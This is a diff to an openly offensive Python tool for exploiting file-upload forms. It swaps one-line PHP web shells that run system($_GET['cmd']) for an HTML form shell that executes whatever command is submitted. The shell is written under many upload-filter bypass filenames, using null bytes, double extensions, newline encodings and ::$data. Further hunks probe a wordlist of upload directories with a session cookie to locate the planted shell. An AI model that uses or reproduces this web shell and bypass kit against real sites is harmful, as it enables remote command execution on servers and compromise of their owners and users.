@@ -18,33 +18,49 @@ def embed_php_in_image(image_file, output_file):
 
 def create_payloads():
     """Create PHP web shell payloads."""
-    payloads = {
-        "shell.php.jpg": "<?php system($_GET['cmd']); ?>",
-        "shell.pHp5": "<?php system($_GET['cmd']); ?>",
-        "shell.png.php": "<?php system($_GET['cmd']); ?>",
-        "shell.php#.png": "<?php system($_GET['cmd']); ?>",
-        "shell.php%20": "<?php system($_GET['cmd']); ?>",
-        "shell.phpJunk123png": "<?php system($_GET['cmd']); ?>",
-        "shell.png.jpg.php": "<?php system($_GET['cmd']); ?>",
-        "shell.php%00.png": "<?php system($_GET['cmd']); ?>",
-        "shell.php...": "<?php system($_GET['cmd']); ?>",
-        "shell.php.png": "<?php system($_GET['cmd']); ?>",
-        "shell.asp::$data": "<?php system($_GET['cmd']); ?>",
-        "A" * 232 + ".php": "<?php system($_GET['cmd']); ?>",
-        "shell.php%0a": "<?php system($_GET['cmd']); ?>",
-        "shell.php%00": "<?php system($_GET['cmd']); ?>",
-        "shell.php%0d%0a": "<?php system($_GET['cmd']); ?>",
-        "shell.php#.png": "<?php system($_GET['cmd']); ?>",
-        "shell.phpJunk123png": "<?php system($_GET['cmd']); ?>",
-        "shell.png.jpg.php": "<?php system($_GET['cmd']); ?>",
-        "shell.php%00.png%00.jpg": "<?php system($_GET['cmd']); ?>",
-    }
+    reverse_shell = """<html>
+  <body>
+    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+      <input type="text" name="cmd" autofocus id="cmd" size="80">
+      <input type="submit" value="Execute">
+    </form>
+    <pre>
+<?php
+  if(isset($_GET['cmd'])) {
+      system($_GET['cmd']);
+  }
+?>
+    </pre>
+  </body>
+</html>"""
+
+    payloads = [
+        "shell.php.jpg",
+        "shell.pHp5",
+        "shell.png.php",
+        "shell.php#.png",
+        "shell.php%20",
+        "shell.phpJunk123png",
+        "shell.png.jpg.php",
+        "shell.php%00.png",
+        "shell.php...",
+        "shell.php.png",
+        "shell.asp::$data",
+        "A" * 232 + ".php",
+        "shell.php%0a",
+        "shell.php%00",
+        "shell.php%0d%0a",
+        "shell.php#.png",
+        "shell.phpJunk123png",
+        "shell.png.jpg.php",
+        "shell.php%00.png%00.jpg"
+    ]
 
     created_files = []
-    for filename, content in payloads.items():
+    for filename in payloads:
         try:
             with open(filename, 'w') as f:
-                f.write(content)
+                f.write(reverse_shell)
             print(f"[+] Created payload: {filename}")
             created_files.append(filename)
         except Exception as e:
@@ -146,7 +162,6 @@ def try_upload_url(base_url, wordlist_file, cookie, payload_filename):
 
 def get_upload_directory(base_url, wordlist_file, payload_filename, COOKIE):
     """
-    Read candidate upload directories from a wordlist and return the first one.
     Lines starting with '#' are ignored.
     """
     with open(wordlist_file, "r") as f:
@@ -156,4 +171,6 @@ def get_upload_directory(base_url, wordlist_file, payload_filename, COOKIE):
         if response.status_code == 200:
             print(f"[*] Directly Accessible Upload directory: {base_url + d + payload_filename}")
             return base_url + d
+        else:
+            print(f"[-] Directory {base_url + d} not accessible.")
     return None
